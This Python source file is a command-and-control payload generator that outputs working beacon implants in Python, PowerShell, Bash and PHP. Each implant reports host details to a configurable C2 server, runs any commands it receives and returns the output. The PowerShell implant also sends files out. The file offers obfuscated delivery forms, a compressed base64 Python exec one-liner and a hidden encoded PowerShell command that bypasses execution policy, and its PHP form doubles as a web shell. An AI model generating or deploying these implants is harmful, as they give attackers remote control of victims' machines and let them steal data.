"""
C2 Payload Generator
Generate various agent payloads with embedded config
"""
import os
import base64
import random
import string
import zlib
from typing import Dict, Any


class PayloadGenerator:
    """Generate C2 agent payloads"""
    
    def __init__(self, c2_url: str = "http://127.0.0.1:8080/c2/beacon"):
        self.c2_url = c2_url
    
    def generate(self, payload_type: str, options: Dict[str, Any] = None) -> str:
        """Generate payload based on type"""
        options = options or {}
        
        generators = {
            "python": self._gen_python,
            "python_oneliner": self._gen_python_oneliner,
            "powershell": self._gen_powershell,
            "powershell_encoded": self._gen_powershell_encoded,
            "bash": self._gen_bash,
            "php": self._gen_php,
        }
        
        generator = generators.get(payload_type, self._gen_python)
        return generator(options)
    
    def _gen_python(self, options: Dict[str, Any]) -> str:
        """Generate full Python beacon agent"""
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        payload = f'''#!/usr/bin/env python3
# Monolith C2 Beacon - Auto-generated
import os,sys,json,time,uuid,base64,random,socket,platform,subprocess
try:
    import requests
    R=True
except:
    import urllib.request as urllib
    R=False

C2="{self.c2_url}"
ID=None
S={sleep}
J={jitter}
UA=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"]

def req(m,u,d=None):
    h={{"User-Agent":random.choice(UA),"Content-Type":"application/json"}}
    try:
        if R:
            r=requests.post(u,json=d,headers=h,timeout=30) if m=="POST" else requests.get(u,headers=h,timeout=30)
            return r.json()
        else:
            req=urllib.Request(u,data=json.dumps(d).encode() if d else None,headers=h,method=m)
            return json.loads(urllib.urlopen(req,timeout=30).read().decode())
    except:
        return None

def info():
    return {{"hostname":socket.gethostname(),"username":os.getenv("USER") or os.getenv("USERNAME"),"os":f"{{platform.system()}} {{platform.release()}}","arch":platform.machine(),"pid":os.getpid(),"ip_internal":"127.0.0.1","integrity":"high" if os.geteuid()==0 else "medium"}}

def run(t):
    c,a=t.get("command",""),t.get("args",[])
    try:
        if c=="shell":return subprocess.getoutput(" ".join(a) if a else "whoami"),True
        elif c=="exit":return "bye",False
        else:return subprocess.getoutput(c+" "+" ".join(a)),True
    except Exception as e:return str(e),False

def main():
    global ID,S,J
    while True:
        try:
            d=info()
            if ID:d["id"]=ID
            r=req("POST",f"{{C2}}/checkin",d)
            if r:
                if r.get("status")=="registered":ID=r["id"]
                S=r.get("sleep",S);J=r.get("jitter",J)
                for t in r.get("tasks",[]):
                    o,ok=run(t)
                    req("POST",f"{{C2}}/result/{{ID}}",{{"task_id":t["task_id"],"output":o,"success":ok}})
                    if not ok and t.get("command")=="exit":return
        except:pass
        time.sleep(S+random.uniform(-S*J/100,S*J/100))

if __name__=="__main__":main()
'''
        return payload
    
    def _gen_python_oneliner(self, options: Dict[str, Any]) -> str:
        """Generate Python one-liner (base64 encoded)"""
        full_payload = self._gen_python(options)
        compressed = zlib.compress(full_payload.encode())
        encoded = base64.b64encode(compressed).decode()
        
        oneliner = f'python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode(\\"{encoded}\\")))"'
        return oneliner
    
    def _gen_powershell(self, options: Dict[str, Any]) -> str:
        """Generate PowerShell beacon"""
        sleep = options.get("sleep", 30)
        jitter = options.get("jitter", 10)
        
        payload = f'''# Monolith C2 PowerShell Beacon
$C2 = "{self.c2_url}"
$ID = $null
$Sleep = {sleep}
$Jitter = {jitter}

function Get-SystemInfo {{
    @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
        arch = if ([Environment]::Is64BitProcess) {{ "x64" }} else {{ "x86" }}
        pid = $PID
        ip_internal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -ne "Loopback" }} | Select-Object -First 1).IPAddress
        integrity = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ "high" }} else {{ "medium" }}
    }}
}}

function Invoke-Checkin {{
    param($Data)
    try {{
        $json = $Data | ConvertTo-Json -Compress
        $response = Invoke-RestMethod -Uri "$C2/checkin" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 30
        return $response
    }} catch {{
        return $null
    }}
}}

function Send-Result {{
    param($BeaconId, $Result)
    try {{
        $json = $Result | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$C2/result/$BeaconId" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 30
    }} catch {{}}
}}

function Execute-Task {{
    param($Task)
    $output = ""
    $success = $true
    
    try {{
        switch ($Task.command) {{
            "shell" {{
                $cmd = $Task.args -join " "
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            }}
            "whoami" {{ $output = whoami }}
            "ps" {{ $output = Get-Process | Format-Table | Out-String }}
            "download" {{
                $path = $Task.args[0]
                $output = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            }}
            "exit" {{ return @{{ output = "bye"; success = $false; exit = $true }} }}
            default {{
                $output = Invoke-Expression ($Task.command + " " + ($Task.args -join " ")) 2>&1 | Out-String
            }}
        }}
    }} catch {{
        $output = $_.Exception.Message
        $success = $false
    }}
    
    return @{{ output = $output; success = $success; exit = $false }}
}}

# Main Loop
while ($true) {{
    try {{
        $info = Get-SystemInfo
        if ($ID) {{ $info["id"] = $ID }}
        
        $response = Invoke-Checkin -Data $info
        
        if ($response) {{
            if ($response.status -eq "registered") {{
                $ID = $response.id
            }}
            $Sleep = if ($response.sleep) {{ $response.sleep }} else {{ $Sleep }}
            $Jitter = if ($response.jitter) {{ $response.jitter }} else {{ $Jitter }}
            
            foreach ($task in $response.tasks) {{
                $result = Execute-Task -Task $task
                Send-Result -BeaconId $ID -Result @{{
                    task_id = $task.task_id
                    output = $result.output
                    success = $result.success
                }}
                if ($result.exit) {{ exit }}
            }}
        }}
    }} catch {{}}
    
    $jitterAmount = $Sleep * ($Jitter / 100)
    $sleepTime = $Sleep + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
    Start-Sleep -Seconds $sleepTime
}}
'''
        return payload
    
    def _gen_powershell_encoded(self, options: Dict[str, Any]) -> str:
        """Generate base64 encoded PowerShell"""
        ps_payload = self._gen_powershell(options)
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
    
    def _gen_bash(self, options: Dict[str, Any]) -> str:
        """Generate Bash beacon"""
        sleep = options.get("sleep", 30)
        
        payload = f'''#!/bin/bash
# Monolith C2 Bash Beacon
C2="{self.c2_url}"
ID=""
SLEEP={sleep}

get_info() {{
    cat <<EOF
{{"hostname":"$(hostname)","username":"$(whoami)","os":"$(uname -s) $(uname -r)","arch":"$(uname -m)","pid":$$,"ip_internal":"$(hostname -I | awk '{{print $1}}')","integrity":"$([ $(id -u) -eq 0 ] && echo high || echo medium)"}}
EOF
}}

checkin() {{
    local data="$1"
    if [ -n "$ID" ]; then
        data=$(echo "$data" | sed 's/}}$/,"id":"'$ID'"}}/')
    fi
    curl -s -X POST "$C2/checkin" -H "Content-Type: application/json" -d "$data" 2>/dev/null
}}

send_result() {{
    local task_id="$1"
    local output="$2"
    output=$(echo "$output" | base64 -w0)
    curl -s -X POST "$C2/result/$ID" -H "Content-Type: application/json" \\
        -d '{{"task_id":"'$task_id'","output":"'$output'","success":true}}' 2>/dev/null
}}

while true; do
    response=$(checkin "$(get_info)")
    
    if [ -n "$response" ]; then
        new_id=$(echo "$response" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)
        [ -n "$new_id" ] && ID="$new_id"
        
        new_sleep=$(echo "$response" | grep -o '"sleep":[0-9]*' | cut -d':' -f2)
        [ -n "$new_sleep" ] && SLEEP=$new_sleep
        
        # Parse and execute tasks (simplified)
        tasks=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        for cmd in $tasks; do
            case "$cmd" in
                shell|whoami|id|pwd) output=$(eval "$cmd") ;;
                exit) exit 0 ;;
                *) output=$(eval "$cmd" 2>&1) ;;
            esac
        done
    fi
    
    sleep $SLEEP
done
'''
        return payload
    
    def _gen_php(self, options: Dict[str, Any]) -> str:
        """Generate PHP beacon (web shell style)"""
        sleep = options.get("sleep", 30)
        
        payload = f'''<?php
// Monolith C2 PHP Beacon
$c2 = "{self.c2_url}";
$id = null;
$sleep = {sleep};

function getInfo() {{
    return [
        'hostname' => gethostname(),
        'username' => get_current_user(),
        'os' => PHP_OS . ' ' . php_uname('r'),
        'arch' => php_uname('m'),
        'pid' => getmypid(),
        'ip_internal' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1',
        'integrity' => 'medium'
    ];
}}

function checkin($data) {{
    global $c2;
    $ch = curl_init("$c2/checkin");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}}

function sendResult($beaconId, $taskId, $output) {{
    global $c2;
    $ch = curl_init("$c2/result/$beaconId");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'task_id' => $taskId,
        'output' => $output,
        'success' => true
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}}

function executeTask($task) {{
    $cmd = $task['command'] ?? '';
    $args = $task['args'] ?? [];
    
    switch ($cmd) {{
        case 'shell':
            return shell_exec(implode(' ', $args));
        case 'whoami':
            return shell_exec('whoami');
        case 'pwd':
            return getcwd();
        case 'ls':
            return implode("\\n", scandir($args[0] ?? '.'));
        default:
            return shell_exec($cmd . ' ' . implode(' ', $args));
    }}
}}

// Main loop (for CLI) or single execution (for web)
if (php_sapi_name() === 'cli') {{
    while (true) {{
        $info = getInfo();
        if ($id) $info['id'] = $id;
        
        $response = checkin($info);
        if ($response) {{
            if (isset($response['id'])) $id = $response['id'];
            if (isset($response['sleep'])) $sleep = $response['sleep'];
            
            foreach ($response['tasks'] ?? [] as $task) {{
                $output = executeTask($task);
                sendResult($id, $task['task_id'], $output);
                if ($task['command'] === 'exit') exit(0);
            }}
        }}
        sleep($sleep);
    }}
}} else {{
    // Web mode - single execution
    if (isset($_POST['cmd'])) {{
        echo shell_exec($_POST['cmd']);
    }}
}}
?>
'''
        return payload
    
    def list_types(self) -> list:
        """List available payload types"""
        return [
            {"type": "python", "name": "Python Agent", "desc": "Full-featured Python beacon"},
            {"type": "python_oneliner", "name": "Python One-liner", "desc": "Compressed base64 one-liner"},
            {"type": "powershell", "name": "PowerShell Agent", "desc": "Full PowerShell beacon"},
            {"type": "powershell_encoded", "name": "PowerShell Encoded", "desc": "Base64 encoded PS command"},
            {"type": "bash", "name": "Bash Agent", "desc": "Bash/Shell beacon script"},
            {"type": "php", "name": "PHP Agent", "desc": "PHP beacon/webshell hybrid"},
        ]


# Singleton instance
_generator = None

def get_payload_generator(c2_url: str = None) -> PayloadGenerator:
    """Get payload generator instance"""
    global _generator
    if _generator is None or c2_url:
        _generator = PayloadGenerator(c2_url or "http://127.0.0.1:8080/c2/beacon")
    return _generator
